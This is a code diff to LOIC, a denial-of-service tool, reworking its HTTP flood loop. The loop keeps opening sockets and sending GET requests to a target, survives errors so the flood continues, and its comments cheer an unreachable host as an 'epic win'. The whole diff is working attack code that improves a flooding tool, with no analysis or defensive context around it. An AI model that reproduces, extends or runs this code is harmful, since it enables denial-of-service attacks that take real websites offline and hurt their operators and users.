@@ -42,6 +42,7 @@ namespace LOIC
 		{
 			try
 			{
+                int bfsize = 1024; // this should be less than the MTU
                 byte[] buf;
                 if (random == true)
                 {
@@ -52,32 +53,45 @@ namespace LOIC
                     buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}{3}{1}", Subsite, Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
                 }
 
-                byte[] recvBuf = new byte[64];
+                byte[] recvBuf = new byte[bfsize];
+                int recvd = 0;
                 while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-					State = ReqState.Connecting; // SET STATE TO CONNECTING //
-					socket.Connect(((IP == "") ? DNS : IP), Port); //(host)
-					socket.Blocking = Resp;
-					State = ReqState.Requesting; // SET STATE TO REQUESTING //
-                    socket.ReceiveTimeout = Timeout;
-					socket.Send(buf, SocketFlags.None);
-					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
-					if (Resp)
+                    try
                     {
-                        try 
-                        { 
-                            socket.Receive(recvBuf);
-                            Downloaded++;
+                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        State = ReqState.Connecting; // SET STATE TO CONNECTING //
+                        socket.Connect(((IP == "") ? DNS : IP), Port); //(host)
+                        socket.Blocking = Resp;
+                        State = ReqState.Requesting; // SET STATE TO REQUESTING //
+                        socket.ReceiveTimeout = Timeout;
+                        socket.Send(buf, SocketFlags.None);
+                        State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
+                        if (Resp)
+                        {
+                            try
+                            {
+                                recvd = 0;
+                                do
+                                {
+                                    recvd = socket.Receive(recvBuf);
+                                } while ((recvd > bfsize) && socket.Connected);
+                                Downloaded++;
+                            }
+                            catch
+                            { // timeout reached - epic win?
+                                Failed++;
+                            }
                         }
-                        catch 
-                        { 
-                            Failed++;
-                        }
+                        socket.Close(); // let's close the socket - there are other methods for socket-starving!
+                        State = ReqState.Completed;  // SET STATE TO COMPLETED
                     }
-					State = ReqState.Completed;  // SET STATE TO COMPLETED // DOWNLOADED++
-					if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+                    catch
+                    { // host unreachable == epic win!
+                        Failed++;
+                    }
+					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
 				}
 			}
 			catch { }
